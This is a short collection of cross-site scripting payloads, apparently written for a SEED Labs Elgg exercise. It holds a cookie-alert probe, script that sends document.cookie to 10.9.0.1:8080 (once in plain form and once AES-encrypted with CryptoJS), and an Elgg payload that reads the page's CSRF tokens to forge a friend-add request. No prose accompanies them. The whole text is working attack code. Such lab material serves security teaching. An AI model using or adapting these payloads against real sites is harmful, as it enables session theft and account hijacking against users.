<script>alert(document.cookie);</script>
<script>fetch("http://10.9.0.1:8080?cookie="+document.cookie); </script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
<script>
    function encryptCookie(data, secret) {
        return CryptoJS.AES.encrypt(data, secret).toString();
    }

    function sendEncryptedCookie() {
        const secret = 'my-secret-key';
        const cookieValue = document.cookie;
        const encryptedCookie = encryptCookie(cookieValue, secret);

        const url = `http://10.9.0.1:8080?cookie=${encodeURIComponent(encryptedCookie)}`;
        
        // Send the encrypted cookie via fetch
        fetch(url);
    }

    // Call the function to send the encrypted cookie
    sendEncryptedCookie();
</script>


<script>
window.onload = function () {
var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token+ts+token;
	Ajax=new XMLHttpRequest();
	Ajax.open("GET", sendurl, true);
	Ajax.send();
}
</script>
